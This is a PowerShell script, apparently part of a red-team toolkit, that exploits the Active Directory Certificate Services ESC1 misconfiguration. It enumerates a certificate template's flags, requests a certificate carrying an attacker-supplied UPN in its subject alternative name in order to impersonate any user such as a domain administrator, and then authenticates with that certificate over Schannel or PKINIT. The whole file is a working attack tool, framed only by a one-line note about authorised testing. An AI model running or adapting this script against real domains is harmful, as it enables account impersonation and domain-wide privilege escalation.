<#
.SYNOPSIS
    AD CS ESC1 - Enrollee Supplies Subject (LOLBAS).
.DESCRIPTION
    Exploits templates with ENROLLEE_SUPPLIES_SUBJECT flag and Client Auth EKU.
    Requests a certificate with an attacker-controlled SAN to impersonate any user.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Vulnerable certificate template name
.PARAMETER TargetUPN
    UPN of the user to impersonate (e.g., "administrator@zsec.red")
.EXAMPLE
    .\Invoke-ESC1.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "VulnTemplate" -TargetUPN "administrator@zsec.red"
.EXAMPLE
    .\Invoke-ESC1.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "VulnTemplate" -TargetUPN "administrator@zsec.red" -AuthMethod Schannel -SkipCleanup
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth,
    [switch]$SkipCleanup
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC1 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC1" "Enrollee Supplies Subject"

# STAGE 1: RECON
Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Target CA       : $CAConfig" -ForegroundColor Gray
Write-Host "    [>] Template        : $TemplateName" -ForegroundColor Gray
Write-Host "    [>] Target Identity : $TargetUPN" -ForegroundColor Gray
Write-Host "    [>] Auth Method     : $AuthMethod" -ForegroundColor Gray

$ctx = Get-ADContext
$tpl = Get-ADObject -SearchBase $ctx.TemplateBase -Filter {cn -eq $TemplateName} `
    -Properties 'msPKI-Certificate-Name-Flag','pKIExtendedKeyUsage' -ErrorAction SilentlyContinue
if (-not $tpl) {
    Write-Host "    [-] Template '$TemplateName' not found" -ForegroundColor Red; exit 1
}
$nameFlag = $tpl.'msPKI-Certificate-Name-Flag'
if (($nameFlag -band 1) -ne 1) {
    Write-Host "    [!] WARNING: ENROLLEE_SUPPLIES_SUBJECT not set (NameFlag=$nameFlag)" -ForegroundColor Yellow
} else {
    Write-Host "    [+] ENROLLEE_SUPPLIES_SUBJECT confirmed (NameFlag=$nameFlag)" -ForegroundColor Green
}
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: POSITION
Write-Stage -Number 2 -Name "POSITIONING" -Status 'SKIPPED'
Write-Host "    [i] No prerequisites - direct exploitation" -ForegroundColor Gray

# STAGE 3: REQUEST
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -SAN "upn=$TargetUPN&" `
    -Template $TemplateName -OutFile "$OutputDir\esc1.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc1"

if (-not $result.Success) {
    Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1
}
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

# STAGE 4: VERIFY
Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [>] Checking issued certificate SAN..." -ForegroundColor Gray
$certDump = certutil -dump $result.CerFile 2>$null
$sanLine = $certDump | Select-String 'Principal Name=' | Select-Object -First 1
if ($sanLine) {
    Write-Host "    [+] SAN in certificate: $($sanLine.Line.Trim())" -ForegroundColor Green
}
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

# STAGE 5: AUTHENTICATE
Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

# STAGE 6: CLEANUP
if (-not $SkipCleanup) {
    Write-Host ""
    Write-Stage -Number 6 -Name "CLEANUP"
    Write-Host "    [i] No AD modifications to revert (ESC1 is read-only)" -ForegroundColor Gray
    Write-Host "    [i] Artifacts: $OutputDir\esc1.*" -ForegroundColor Gray
    Write-Stage -Number 6 -Name "CLEANUP" -Status 'COMPLETE'
}

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
